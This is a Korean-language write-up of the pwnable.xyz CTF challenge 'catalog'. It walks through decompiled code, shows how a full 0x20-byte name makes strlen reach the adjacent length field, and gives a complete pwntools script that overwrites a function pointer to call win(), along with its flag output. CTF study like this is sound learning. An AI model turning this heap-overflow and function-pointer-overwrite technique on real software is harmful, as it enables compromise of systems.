# [pwnable.xyz] catalog

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Another name saving app, so you don't forget it.
>
> Release: [catalog.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9000357/catalog.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/176163177-534cfb9e-4e97-4123-ba87-99b1a53cea79.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `struct Catalog`

![image](https://user-images.githubusercontent.com/104156058/176164605-1b592d8b-2126-4a80-bc93-f96ea42a96bc.png)

Catalog의 정보를 저장하는 구조체이다. `0x20`바이트 문자열 `name`, 이름의 길이 `nameLen`, 함수 포인터 `func`로 구성된다.

### `main()`

#### 1. Write name

```c
      if ( op != 1 )
        break;
      write_name();
```

#### `write_name()`

```c
Catalog *write_name()
{
  __int64 len; // rdx
  Catalog *result; // rax
  int i; // [rsp+4h] [rbp-Ch]
  Catalog *c; // [rsp+8h] [rbp-8h]

  c = (Catalog *)malloc(0x30uLL);
  for ( i = 0; catalog[i]; ++i )
    ;
  catalog[i] = c;
  c->func = print_name;
  c->nameLen = 0x20LL;
  edit_name(c);
  len = strlen(c->name);
  result = c;
  c->nameLen = len;
  return result;
}
```

Catalog를 하나 생성하고, 그 정보가 저장된 메모리의 주소를 전역 변수 `catalog`에 저장한다. `edit_name()`으로 `c->name`에 이름을 입력받고, `c->nameLen`에는 입력한 `name`의 길이가 들어간다. `c->func`에는 기본적으로 `print_name()`의 주소가 들어간다.

#### 2. Edit name

```c
    if ( op == 2 )
    {
      for ( i = 0; catalog[i]; ++i )
        ;
      printf("index: ");
      idx = read_int32();
      if ( idx >= 0 && idx < i )
        edit_name(catalog[idx]);
      else
LABEL_16:
        puts("Invalid index");
    }
```

`idx`를 입력받고 `catalog[idx]`를 인자로 전달하여 `edit_name()`을 실행한다.

#### `edit_name()`

```c
ssize_t __fastcall edit_name(Catalog *c)
{
  printf("name: ");
  return read(0, c, c->nameLen);
}
```

`c->name`에 `c->nameLen`만큼 문자열을 입력받는다.

#### 3. Print name

```c
    else if ( op == 3 )
    {
      for ( j = 0; catalog[j]; ++j )
        ;
      printf("index: ");
      _idx = read_int32();
      if ( _idx < 0 || _idx >= j )
        goto LABEL_16;
      ((void (__fastcall *)(Catalog *))catalog[_idx]->func)(catalog[_idx]);
    }
```

`_idx`를 입력받고 `catalog[_idx]`에 저장된 catalog를 가져온다.그 메모리의 주소를 인자로 전달하여 `func`에 저장된 함수를 실행한다.

## Exploit

`write_name()`에서 `name`에 `0x20`바이트를 가득 채우면, 바로 뒤의 `nameLen` 때문에 `strlen(c->name)`의 반환값이 `0x21`이 된다.

![image](https://user-images.githubusercontent.com/104156058/176165902-15aa9aca-d104-47f3-b6a7-5c9607367b19.png)

이 상태에서 `edit_name()`을 실행하면 `c->nameLen`만큼 문자열을 입력할 수 있으므로, `c->nameLen`을 `0xff` 이하의 임의의 값으로 조작할 수 있다. `0x29` 이상의 값으로 조작하면, `c->func`를 `win()`의 주소(`0x40092c`) 로 덮어쓸 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30023)

sla = r.sendlineafter
sa = r.sendafter

sla('> ', '1')
sa('name: ', 'A' * 0x20)

sla('> ', '2')
sla('index: ', '0')
sa('name: ', 'A' * 0x20 + chr(0x29))

sla('> ', '2')
sla('index: ', '0')
sa('name: ', 'A' * 0x28 + chr(0x2c))

sla('> ', '3')
sla('index: ', '0') # call win()

r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30023: Done
[*] Switching to interactive mode
FLAG{I_should_start_using_strnlen}
```